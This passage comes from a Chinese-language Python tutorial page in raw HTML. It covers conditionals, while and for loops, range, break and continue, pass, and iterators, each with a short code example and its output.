'cherry'}\n{'cherry', 'banana', 'runoob', 'google'}\n{'cherry', 'google', 'banana', 'runoob'}\n{'cherry', 'banana', 'google', 'apple', 'runoob'}\n{'cherry', 'banana', 'google', 'apple', 'runoob'}\n'''</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n\n<h2 id=\"条件控制\"><a href=\"#条件控制\" class=\"headerlink\" title=\"条件控制\"></a>条件控制</h2><h3 id=\"if语句\"><a href=\"#if语句\" class=\"headerlink\" title=\"if语句\"></a>if语句</h3><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">if</span> condition_1<span class=\"token punctuation\">:</span>\n    statement_block_1\n<span class=\"token keyword\">elif</span> condition_2<span class=\"token punctuation\">:</span>\n    statement_block_2\n<span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n    statement_block_3\n    \n<span class=\"token triple-quoted-string string\">'''\n如果 \"condition_1\" 为 True 将执行 \"statement_block_1\" 块语句\n如果 \"condition_1\" 为False，将判断 \"condition_2\"\n如果\"condition_2\" 为 True 将执行 \"statement_block_2\" 块语句\n如果 \"condition_2\" 为False，将执行\"statement_block_3\"块语句\n'''</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<ol>\n<li>python每个条件后面都要使用冒号，接着是执行语句</li>\n<li>缩进相同的作为语句块，缩进为一个tab</li>\n<li>python中没有switch-case语句</li>\n</ol>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">age <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">input</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"请输入你家狗狗的年龄: \"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">if</span> age <span class=\"token operator\">&lt;=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"你是在逗我吧!\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">elif</span> age <span class=\"token operator\">==</span> <span class=\"token number\">1</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"相当于 14 岁的人。\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">elif</span> age <span class=\"token operator\">==</span> <span class=\"token number\">2</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"相当于 22 岁的人。\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">elif</span> age <span class=\"token operator\">&gt;</span> <span class=\"token number\">2</span><span class=\"token punctuation\">:</span>\n    human <span class=\"token operator\">=</span> <span class=\"token number\">22</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>age <span class=\"token operator\">-</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> <span class=\"token number\">5</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"对应人类年龄: \"</span><span class=\"token punctuation\">,</span> human<span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\"># 退出提示</span>\n<span class=\"token builtin\">input</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"点击 enter 键退出\"</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token triple-quoted-string string\">'''\n请输入你家狗狗的年龄: 3\n\n对应人类年龄:  27\n点击 enter 键退出\n\n'''</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"if嵌套\"><a href=\"#if嵌套\" class=\"headerlink\" title=\"if嵌套\"></a>if嵌套</h3><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">if</span> 表达式<span class=\"token number\">1</span><span class=\"token punctuation\">:</span>\n    语句\n    <span class=\"token keyword\">if</span> 表达式<span class=\"token number\">2</span><span class=\"token punctuation\">:</span>\n        语句\n    <span class=\"token keyword\">elif</span> 表达式<span class=\"token number\">3</span><span class=\"token punctuation\">:</span>\n        语句\n    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n        语句\n<span class=\"token keyword\">elif</span> 表达式<span class=\"token number\">4</span><span class=\"token punctuation\">:</span>\n    语句\n<span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n    语句\n\nnum <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">input</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"输入一个数字：\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">if</span> num <span class=\"token operator\">%</span> <span class=\"token number\">2</span> <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">if</span> num <span class=\"token operator\">%</span> <span class=\"token number\">3</span> <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"你输入的数字可以整除 2 和 3\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"你输入的数字可以整除 2，但不能整除 3\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">if</span> num <span class=\"token operator\">%</span> <span class=\"token number\">3</span> <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"你输入的数字可以整除 3，但不能整除 2\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"你输入的数字不能整除 2 和 3\"</span><span class=\"token punctuation\">)</span>\n\n\n<span class=\"token triple-quoted-string string\">'''\n输入一个数字：4\n你输入的数字可以整除 2，但不能整除 3\n'''</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"循环语句\"><a href=\"#循环语句\" class=\"headerlink\" title=\"循环语句\"></a>循环语句</h2><ol>\n<li>python中循环有for和while</li>\n<li>缩进和冒号和条件控制相似</li>\n</ol>\n<h3 id=\"while循环\"><a href=\"#while循环\" class=\"headerlink\" title=\"while循环\"></a>while循环</h3><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">while</span> 判断条件<span class=\"token punctuation\">(</span>condition<span class=\"token punctuation\">)</span>：\n    执行语句<span class=\"token punctuation\">(</span>statements<span class=\"token punctuation\">)</span>……\n    \nn <span class=\"token operator\">=</span> <span class=\"token number\">10</span>\ni <span class=\"token operator\">=</span> <span class=\"token number\">0</span>\n<span class=\"token builtin\">sum</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span>\n<span class=\"token keyword\">while</span> i <span class=\"token operator\">&lt;=</span> n<span class=\"token punctuation\">:</span>\n    <span class=\"token builtin\">sum</span> <span class=\"token operator\">=</span> <span class=\"token builtin\">sum</span> <span class=\"token operator\">+</span> i\n    i <span class=\"token operator\">+=</span><span class=\"token number\">1</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">sum</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token triple-quoted-string string\">'''\n55\n'''</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"无限循环\"><a href=\"#无限循环\" class=\"headerlink\" title=\"无限循环\"></a>无限循环</h3><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">while</span> <span class=\"token number\">1</span> <span class=\"token operator\">==</span> <span class=\"token number\">1</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'随便输入，输入0退出'</span><span class=\"token punctuation\">)</span>\n    var <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">input</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">if</span> var <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span>\n        exit<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># break</span>\n        \n        \n<span class=\"token keyword\">while</span> <span class=\"token number\">1</span><span class=\"token punctuation\">:</span> <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'1'</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"while-else\"><a href=\"#while-else\" class=\"headerlink\" title=\"while-else\"></a>while-else</h3><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">while</span> <span class=\"token operator\">&lt;</span>expr<span class=\"token operator\">&gt;</span><span class=\"token punctuation\">:</span>\n    <span class=\"token operator\">&lt;</span>statement<span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span><span class=\"token operator\">&gt;</span>\n<span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n    <span class=\"token operator\">&lt;</span>additional_statement<span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span><span class=\"token operator\">&gt;</span>\n    \ncount <span class=\"token operator\">=</span> <span class=\"token number\">0</span>\n<span class=\"token keyword\">while</span> count <span class=\"token operator\">&lt;</span> <span class=\"token number\">5</span><span class=\"token punctuation\">:</span>\n   <span class=\"token keyword\">print</span> <span class=\"token punctuation\">(</span>count<span class=\"token punctuation\">,</span> <span class=\"token string\">\" 小于 5\"</span><span class=\"token punctuation\">)</span>\n   count <span class=\"token operator\">=</span> count <span class=\"token operator\">+</span> <span class=\"token number\">1</span>\n<span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n   <span class=\"token keyword\">print</span> <span class=\"token punctuation\">(</span>count<span class=\"token punctuation\">,</span> <span class=\"token string\">\" 大于或等于 5\"</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"for语句\"><a href=\"#for语句\" class=\"headerlink\" title=\"for语句\"></a>for语句</h3><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">for</span> <span class=\"token operator\">&lt;</span>variable<span class=\"token operator\">&gt;</span> <span class=\"token keyword\">in</span> <span class=\"token operator\">&lt;</span>sequence<span class=\"token operator\">&gt;</span><span class=\"token punctuation\">:</span>\n    <span class=\"token operator\">&lt;</span>statements<span class=\"token operator\">&gt;</span>\n<span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n    <span class=\"token operator\">&lt;</span>statements<span class=\"token operator\">&gt;</span>\n    \nsites <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">\"Baidu\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Google\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Runoob\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Taobao\"</span><span class=\"token punctuation\">]</span>\n<span class=\"token keyword\">for</span> site <span class=\"token keyword\">in</span> sites<span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">if</span> site <span class=\"token operator\">==</span> <span class=\"token string\">\"Runoob\"</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"菜鸟教程!\"</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">break</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"循环数据 \"</span> <span class=\"token operator\">+</span> site<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"没有循环数据!\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"完成循环!\"</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"range函数\"><a href=\"#range函数\" class=\"headerlink\" title=\"range函数\"></a>range函数</h3><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">10</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token operator\">-</span><span class=\"token number\">10</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">-</span><span class=\"token number\">100</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">-</span><span class=\"token number\">40</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span>\na <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'Google'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Baidu'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Runoob'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Taobao'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'QQ'</span><span class=\"token punctuation\">]</span>\n<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">list</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token triple-quoted-string string\">'''\n0\n1\n2\n5\n1\n4\n7\n-10\n-50\n-90\n0 Google\n1 Baidu\n2 Runoob\n3 Taobao\n4 QQ\n[0, 1, 2, 3, 4]\n'''</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"break和continue\"><a href=\"#break和continue\" class=\"headerlink\" title=\"break和continue\"></a>break和continue</h3><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">n <span class=\"token operator\">=</span> <span class=\"token number\">5</span>\n<span class=\"token keyword\">while</span> n <span class=\"token operator\">&gt;</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span>\n    n <span class=\"token operator\">-=</span> <span class=\"token number\">1</span>\n    <span class=\"token keyword\">if</span> n <span class=\"token operator\">==</span> <span class=\"token number\">2</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">break</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>n<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'循环结束。'</span><span class=\"token punctuation\">)</span>\n\nn <span class=\"token operator\">=</span> <span class=\"token number\">5</span>\n<span class=\"token keyword\">while</span> n <span class=\"token operator\">&gt;</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span>\n    n <span class=\"token operator\">-=</span> <span class=\"token number\">1</span>\n    <span class=\"token keyword\">if</span> n <span class=\"token operator\">==</span> <span class=\"token number\">2</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">continue</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>n<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'循环结束。'</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token triple-quoted-string string\">'''\n4\n3\n循环结束。\n4\n3\n1\n0\n循环结束。\n'''</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"for-else\"><a href=\"#for-else\" class=\"headerlink\" title=\"for-else\"></a>for-else</h3><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">for</span> n <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">for</span> x <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">if</span> n <span class=\"token operator\">%</span> x <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>n<span class=\"token punctuation\">,</span> <span class=\"token string\">'等于'</span><span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">,</span> <span class=\"token string\">'*'</span><span class=\"token punctuation\">,</span> n<span class=\"token operator\">//</span>x<span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">break</span>  <span class=\"token comment\"># 直接跳出第一个循环，不执行else</span>\n    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n        <span class=\"token comment\"># 循环中没有找到元素</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>n<span class=\"token punctuation\">,</span> <span class=\"token string\">' 是质数'</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token triple-quoted-string string\">'''\n2  是质数\n3  是质数\n4 等于 2 * 2\n5  是质数\n6 等于 2 * 3\n7  是质数\n8 等于 2 * 4\n9 等于 3 * 3\n'''</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"pass语句\"><a href=\"#pass语句\" class=\"headerlink\" title=\"pass语句\"></a>pass语句</h3><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">for</span> letter <span class=\"token keyword\">in</span> <span class=\"token string\">'Runoob'</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">if</span> letter <span class=\"token operator\">==</span> <span class=\"token string\">'o'</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">pass</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'执行 pass 块'</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'当前字母 :'</span><span class=\"token punctuation\">,</span> letter<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Good bye!\"</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token triple-quoted-string string\">'''\n当前字母 : R\n当前字母 : u\n当前字母 : n\n执行 pass 块\n当前字母 : o\n执行 pass 块\n当前字母 : o\n当前字母 : b\nGood bye!\n'''</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>pass 不做任何事情，一般用做占位语句</p>\n<h2 id=\"迭代器和生成器\"><a href=\"#迭代器和生成器\" class=\"headerlink\" title=\"迭代器和生成器\"></a>迭代器和生成器</h2><h3 id=\"迭代器\"><a href=\"#迭代器\" class=\"headerlink\" title=\"迭代器\"></a>迭代器</h3><p>迭代器两个基本函数<code>iter()</code> <code>next()</code></p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token builtin\">list</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">]</span>\nit <span class=\"token operator\">=</span> <span class=\"token builtin\">iter</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">list</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 创建迭代器对象</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">next</span><span class=\"token punctuation\">(</span>it<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 输出迭代器的下一个元素</span>\n<span class=\"token comment\"># 1</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">next</span><span class=\"token punctuation\">(</span>it<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># 2</span>\n\n<span class=\"token builtin\">list</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">]</span>\nit <span class=\"token operator\">=</span> <span class=\"token builtin\">iter</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">list</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 创建迭代器对象</span>\n<span class=\"token keyword\">for</span> x <span class=\"token keyword\">in</span> it<span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">,</span> end<span class=\"token operator\">=</span><span class=\"token string\">\" \"</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># 1 2 3 4</span>\n    \n<span class=\"token builtin\">list</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">]</span>\nit <span class=\"token operator\">=</span> <span class=\"token builtin\">iter</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">list</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 创建迭代器对象</span>\n<span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">next</span><span class=\"token punctuation\">(</span>it<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">except</span> StopIteration<span class=\"token punctuation\">:</span>\n        exit<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token triple-quoted-string string\">'''\n1\n2\n3\n4\n'''</span>\n\n<span class=\"token triple-quoted-string string\">'''\n1\n2\n1 2 3 4 1\n2\n3\n4\n'''</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"创建一个迭代器\"><a href=\"#创建一个迭代器\" class=\"headerlink\" title=\"创建一个迭代器\"></a>创建一个迭代器</h3><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">class</span> <span class=\"token class-name\">MyNumbers</span><span class=\"token punctuation\">:</span>\n  <span class=\"token keyword\">def</span> <span class=\"token function\">__iter__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    self<span class=\"token punctuation\">.</span>a <span class=\"token operator\">=</span> <span class=\"token number\">1</span>\n    <span class=\"token keyword\">return</span> self\n \n  <span class=\"token keyword\">def</span> <span class=\"token function\">__next__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    x <span class=\"token operator\">=</span> self<span class=\"token punctuation\">.</span>a\n    self<span class=\"token punctuation\">.</span>a <span class=\"token operator\">+=</span> <span class=\"token number\">1</span>\n    <span class=\"token keyword\">return</span> x\n \nmyclass <span class=\"token operator\">=</span> MyNumbers<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\nmyiter <span class=\"token operator\">=</span> <span class=\"token builtin\">iter</span><span class=\"token punctuation\">(</span>myclass<span class=\"token punctuation\">)</span>\n \n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">next</span><span class=\"token punctuation\">(</span>myiter<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">next</span><span class=\"token punctuation\">(</span>myiter<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">next</span><span class=\"token punctuation\">(</span>myiter<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">next</span><span 